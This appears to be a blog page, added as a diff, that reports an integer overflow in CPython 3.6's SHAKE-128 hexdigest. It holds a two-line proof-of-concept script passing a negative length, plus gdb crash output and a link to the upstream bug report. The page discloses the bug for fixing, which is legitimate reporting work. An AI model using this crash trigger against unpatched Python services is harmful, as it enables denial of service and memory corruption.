@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Python: integer overflow in the hexdigest | Hello</title>
+    <meta name="description" content="1">
+    
+    
+    <link rel="preload" href="/assets/css/0.styles.153793e6.css" as="style"><link rel="preload" href="/assets/js/app.fb63a1b9.js" as="script"><link rel="preload" href="/assets/js/42.10b887da.js" as="script"><link rel="prefetch" href="/assets/js/10.6aae25a8.js"><link rel="prefetch" href="/assets/js/11.e5a6ecb1.js"><link rel="prefetch" href="/assets/js/12.e6734d6c.js"><link rel="prefetch" href="/assets/js/13.c45be31f.js"><link rel="prefetch" href="/assets/js/14.7fe2edb8.js"><link rel="prefetch" href="/assets/js/15.7d96271b.js"><link rel="prefetch" href="/assets/js/16.d5c5556b.js"><link rel="prefetch" href="/assets/js/17.1a634ded.js"><link rel="prefetch" href="/assets/js/18.e6787f4e.js"><link rel="prefetch" href="/assets/js/19.a31276f8.js"><link rel="prefetch" href="/assets/js/2.6cf84733.js"><link rel="prefetch" href="/assets/js/20.f1ebd130.js"><link rel="prefetch" href="/assets/js/21.9fd25a7d.js"><link rel="prefetch" href="/assets/js/22.7ec64c15.js"><link rel="prefetch" href="/assets/js/23.a0a7d0ea.js"><link rel="prefetch" href="/assets/js/24.c17f3010.js"><link rel="prefetch" href="/assets/js/25.9bbf45e5.js"><link rel="prefetch" href="/assets/js/26.4f930016.js"><link rel="prefetch" href="/assets/js/27.b6d66343.js"><link rel="prefetch" href="/assets/js/28.ded43c8f.js"><link rel="prefetch" href="/assets/js/29.35b25580.js"><link rel="prefetch" href="/assets/js/3.88ebc755.js"><link rel="prefetch" href="/assets/js/30.a0b7fe3b.js"><link rel="prefetch" href="/assets/js/31.89d75be7.js"><link rel="prefetch" href="/assets/js/32.d7c054e6.js"><link rel="prefetch" href="/assets/js/33.9a5f3e99.js"><link rel="prefetch" href="/assets/js/34.ee5cfb6f.js"><link rel="prefetch" href="/assets/js/35.2054ab64.js"><link rel="prefetch" href="/assets/js/36.73bb48c1.js"><link rel="prefetch" href="/assets/js/37.5a1d6d20.js"><link rel="prefetch" href="/assets/js/38.c7d42097.js"><link rel="prefetch" href="/assets/js/39.fd864930.js"><link rel="prefetch" href="/assets/js/4.dc8e7db2.js"><link rel="prefetch" href="/assets/js/40.6c289e11.js"><link rel="prefetch" href="/assets/js/41.0ed23031.js"><link rel="prefetch" href="/assets/js/43.d348e521.js"><link rel="prefetch" href="/assets/js/44.f98660b8.js"><link rel="prefetch" href="/assets/js/45.a141b3d0.js"><link rel="prefetch" href="/assets/js/46.3a3b1b86.js"><link rel="prefetch" href="/assets/js/47.d2f1996d.js"><link rel="prefetch" href="/assets/js/48.0bd12b2f.js"><link rel="prefetch" href="/assets/js/5.6adfd92b.js"><link rel="prefetch" href="/assets/js/6.f9bcea16.js"><link rel="prefetch" href="/assets/js/7.ad2cffde.js"><link rel="prefetch" href="/assets/js/8.8932bce4.js"><link rel="prefetch" href="/assets/js/9.892cc635.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.153793e6.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="page-main"><div class="component-nav-menu"><div class="placeholder"></div> <div class="search-wrapper"><div aria-haspopup="listbox" role="combobox" aria-owns="el-autocomplete-9771" class="el-autocomplete"><div class="el-input el-input--prefix"><!----><input type="text" autocomplete="off" valueKey="title" placeholder="请输入内容" fetchSuggestions="function () { [native code] }" triggerOnFocus="true" debounce="300" placement="bottom-start" popperAppendToBody="true" background-color="#eee" class="el-input__inner"><span class="el-input__prefix"><i class="el-input__icon el-icon-search"></i></span><!----><!----><!----></div><div role="region" class="el-autocomplete-suggestion el-popper" style="width:;display:none;"><div class="el-scrollbar"><div class="el-autocomplete-suggestion__wrap el-scrollbar__wrap el-scrollbar__wrap--hidden-default"><ul class="el-scrollbar__view el-autocomplete-suggestion__list"></ul></div><div class="el-scrollbar__bar is-horizontal"><div class="el-scrollbar__thumb" style="width:0;transform:translateX(0%);ms-transform:translateX(0%);webkit-transform:translateX(0%);"></div></div><div class="el-scrollbar__bar is-vertical"><div class="el-scrollbar__thumb" style="height:0;transform:translateY(0%);ms-transform:translateY(0%);webkit-transform:translateY(0%);"></div></div></div></div></div></div> <ul role="menubar" class="el-menu--horizontal el-menu" style="background-color:;"><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Home
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Blog
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        TimeLine
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Github
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        About
+      </li></ul></div> <div class="page-container"><div class="component-page"><div class="page-content"><!----> <div class="content custom"><h2 id="python-version"><a href="#python-version" aria-hidden="true" class="header-anchor">#</a> python version</h2> <div class="language- extra-class"><pre class="language-text"><code>python version:
+Python 3.6.7rc1+ (heads/3.6:cb0bec3, Oct  1 2018, 02:19:39)
+[GCC 7.3.0] on linux
+</code></pre></div><h2 id="error-log"><a href="#error-log" aria-hidden="true" class="header-anchor">#</a> error log</h2> <p>./python poc.py</p> <p>cat ./poc.py</p> <div class="language- extra-class"><pre class="language-text"><code>import hashlib
+hashlib.shake_128().hexdigest(-10)
+</code></pre></div><p>gdb info</p> <div class="language- extra-class"><pre class="language-text"><code>RAX: 0x7ffff3615f90 --&gt; 0xfffffffffffffffa
+RBX: 0xa8
+RCX: 0x7ffff3616028 --&gt; 0xf938000001a4
+RDX: 0x18
+RSI: 0x7fffffffd6e0 --&gt; 0x6ab2a5fe4fe8efd
+RDI: 0x7ffff3615fe0 --&gt; 0x44b6a41dfdc1a3df
+RBP: 0x7fffffffd510 --&gt; 0xa8
+RSP: 0x7fffffffcc78 --&gt; 0x7ffff6e936cf (mov    rcx,QWORD PTR [rbp-0x38])
+RIP: 0x7ffff6120786 (&lt;__memmove_sse2_unaligned_erms+614&gt;:	movntdq XMMWORD PTR [rdi+0x20],xmm2)
+R8 : 0xfffffffffffffff0
+R9 : 0x10007e6bac07 --&gt; 0x0
+R10: 0x7ffff3616038 --&gt; 0x0
+R11: 0x7ffff3615f90 --&gt; 0xfffffffffffffffa
+R12: 0x7ffff3615f90 --&gt; 0xfffffffffffffffa
+R13: 0x7fffffffd650 --&gt; 0xa35bf3e9cd13e78e
+R14: 0x7ffff3615f90 --&gt; 0xfffffffffffffffa
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff6120779 &lt;__memmove_sse2_unaligned_erms+601&gt;:	sub    rdx,0x40
+   0x7ffff612077d &lt;__memmove_sse2_unaligned_erms+605&gt;:	movntdq XMMWORD PTR [rdi],xmm0
+   0x7ffff6120781 &lt;__memmove_sse2_unaligned_erms+609&gt;:	movntdq XMMWORD PTR [rdi+0x10],xmm1
+=&gt; 0x7ffff6120786 &lt;__memmove_sse2_unaligned_erms+614&gt;:	movntdq XMMWORD PTR [rdi+0x20],xmm2
+   0x7ffff612078b &lt;__memmove_sse2_unaligned_erms+619&gt;:	movntdq XMMWORD PTR [rdi+0x30],xmm3
+   0x7ffff6120790 &lt;__memmove_sse2_unaligned_erms+624&gt;:	add    rdi,0x40
+   0x7ffff6120794 &lt;__memmove_sse2_unaligned_erms+628&gt;:	cmp    rdx,0x40
+   0x7ffff6120798 &lt;__memmove_sse2_unaligned_erms+632&gt;:	ja     0x7ffff6120758 &lt;__memmove_sse2_unaligned_erms+568&gt;
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffcc78 --&gt; 0x7ffff6e936cf (mov    rcx,QWORD PTR [rbp-0x38])
+0008| 0x7fffffffcc80 --&gt; 0x7fffffffccf0 --&gt; 0x41b58ab3
+0016| 0x7fffffffcc88 --&gt; 0x7fffffffcd90 --&gt; 0x6
+0024| 0x7fffffffcc90 --&gt; 0xffffffff99e --&gt; 0x0
+0032| 0x7fffffffcc98 --&gt; 0x7fffffffcd50 --&gt; 0x0
+0040| 0x7fffffffcca0 --&gt; 0x0
+0048| 0x7fffffffcca8 --&gt; 0x7ffff3616038 --&gt; 0x0
+0056| 0x7fffffffccb0 --&gt; 0x7ffff358a068 --&gt; 0x1
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+__memmove_sse2_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:492
+492	../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S: No such file or directory.
+gdb-peda$ bt
+#0  __memmove_sse2_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:492
+#1  0x00007ffff6e936cf in ?? () from /usr/lib/x86_64-linux-gnu/libasan.so.4
+#2  0x00007ffff2a5eab4 in memcpy (__len=0xa8, __src=&lt;optimized out&gt;, __dest=&lt;optimized out&gt;) at /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34
+#3  _PySHA3_KeccakP1600_ExtractLanes (state=&lt;optimized out&gt;, data=&lt;optimized out&gt;, laneCount=0x15) at /home/test/cpython/Modules/_sha3/kcp/KeccakP-1600-opt64.c:342
+#4  0x00007ffff2a5ec2c in _PySHA3_KeccakP1600_ExtractBytes (state=0x7fffffffd650, data=0x7ffff3615f90 &quot;\372\377\377\377\377\377\377\377\002&quot;, offset=&lt;optimized out&gt;, length=0xa8)
+    at /home/test/cpython/Modules/_sha3/kcp/KeccakP-1600-opt64.c:375
+#5  0x00007ffff2a5ee1d in _PySHA3_KeccakWidth1600_SpongeSqueeze (instance=0x7fffffffd650, data=&lt;optimized out&gt;, dataByteLen=0x1ffffffffffffff6)
+    at /home/test/cpython/Modules/_sha3/kcp/KeccakSponge.inc:287
+#6  0x00007ffff2a5f793 in _SHAKE_digest (hex=0x1, digestlen=0xfffffffffffffff6, self=0x7ffff7ed98e8) at /home/test/cpython/Modules/_sha3/sha3module.c:620
+#7  _sha3_shake_128_hexdigest_impl (length=0xfffffffffffffff6, self=0x7ffff7ed98e8) at /home/test/cpython/Modules/_sha3/sha3module.c:669
+#8  _sha3_shake_128_hexdigest (self=0x7ffff7ed98e8, args=&lt;optimized out&gt;, nargs=&lt;optimized out&gt;, kwnames=&lt;optimized out&gt;) at /home/test/cpython/Modules/_sha3/clinic/sha3module.c.h:149
+#9  0x000055555583eab6 in _PyCFunction_FastCallDict (kwargs=0x0, nargs=0x1, args=0x616000021518, func_obj=0x7ffff2e86f30) at Objects/methodobject.c:250
+#10 _PyCFunction_FastCallKeywords (func=func@entry=0x7ffff2e86f30, stack=0x616000021518, nargs=nargs@entry=0x1, kwnames=kwnames@entry=0x0) at Objects/methodobject.c:294
+#11 0x0000555555995945 in call_function (pp_stack=pp_stack@entry=0x7fffffffdc30, oparg=oparg@entry=0x1, kwnames=kwnames@entry=0x0) at Python/ceval.c:4837
+#12 0x000055555599feaa in _PyEval_EvalFrameDefault (f=&lt;optimized out&gt;, throwflag=&lt;optimized out&gt;) at Python/ceval.c:3335
+#13 0x0000555555994939 in PyEval_EvalFrameEx (throwflag=0x0, f=0x616000021398) at Python/ceval.c:754
+#14 _PyEval_EvalCodeWithName (_co=_co@entry=0x7ffff36088a0, globals=globals@entry=0x0, locals=locals@entry=0x7ffff355a9d8, args=args@entry=0x0, argcount=argcount@entry=0x0, kwnames=kwnames@entry=0x0,
+    kwargs=0x0, kwcount=0x0, kwstep=0x2, defs=0x0, defcount=0x0, kwdefs=0x0, closure=0x0, name=0x0, qualname=0x0) at Python/ceval.c:4166
+#15 0x0000555555997b73 in PyEval_EvalCodeEx (closure=0x0, kwdefs=0x0, defcount=0x0, defs=0x0, kwcount=0x0, kws=0x0, argcount=0x0, args=0x0, locals=locals@entry=0x7ffff355a9d8, globals=globals@entry=0x0,
+    _co=_co@entry=0x7ffff36088a0) at Python/ceval.c:4187
+#16 PyEval_EvalCode (co=co@entry=0x7ffff36088a0, globals=globals@entry=0x7ffff7e5a318, locals=locals@entry=0x7ffff7e5a318) at Python/ceval.c:731
+#17 0x00005555556b5b3b in run_mod (arena=0x7ffff7e75150, flags=&lt;optimized out&gt;, locals=0x7ffff7e5a318, globals=0x7ffff7e5a318, filename=0x7ffff358d270, mod=0x62500001e300) at Python/pythonrun.c:1025
+#18 PyRun_FileExFlags (fp=&lt;optimized out&gt;, filename_str=&lt;optimized out&gt;, start=&lt;optimized out&gt;, globals=&lt;optimized out&gt;, locals=&lt;optimized out&gt;, closeit=&lt;optimized out&gt;, flags=&lt;optimized out&gt;)
+    at Python/pythonrun.c:978
+#19 0x00005555556b5fdc in PyRun_SimpleFileExFlags (fp=&lt;optimized out&gt;,
+    filename=0x7ffff35c2680 &quot;\314\070\064\302\227\a\254\bJf\331u\230N\273\022\355@\200\352\024`z[\267&amp;\257+\022Q\324\017\310\nSyF2+\001{\327\354\355\245\275\002\064d-\235x\\\327O\230٧\036ތF\222\326\336\060\027q\220\037\217\b\364#=\366\224,\362\355\224i4h\030.c\377\225\360.׀M\033\066\251\ve'M=\261\t\365\307\016\267\203Q\316\313n\251]+\351H\222\244\266{\224FG\257\022\340\071\233r\300\220\065\031\236][\266\v\027\071#\354Ɣ\310\\\243M\243\251\250\372_\362^Φ\306ڝ\222\365\062O1nY\224pĥ\243IV\364\070\356\232\\\222z\242\321\v\027|\342\027\325\325O֬\300\252a0\250&quot;..., closeit=0x1, flags=&lt;optimized out&gt;)
+    at Python/pythonrun.c:419
+#20 0x00005555556f2704 in run_file (p_cf=0x7fffffffe2b0, filename=0x604000000010 L&quot;crash.py&quot;, fp=0x616000034880) at Modules/main.c:340
+#21 Py_Main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at Modules/main.c:810
+#22 0x000055555569a293 in main (argc=argc@entry=0x2, argv=argv@entry=0x7fffffffe528) at ./Programs/python.c:69
+#23 0x00007ffff6086b97 in __libc_start_main (main=0x55555569a050 &lt;main&gt;, argc=0x2, argv=0x7fffffffe528, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe518)
+    at ../csu/libc-start.c:310
+#24 0x000055555569bb2a in _start ()
+</code></pre></div><h2 id="report"><a href="#report" aria-hidden="true" class="header-anchor">#</a> report</h2> <p>https://bugs.python.org/issue34922</p></div></div></div></div></div></div>
+    <script src="/assets/js/app.fb63a1b9.js" defer></script><script src="/assets/js/42.10b887da.js" defer></script>
+  </body>
+</html>
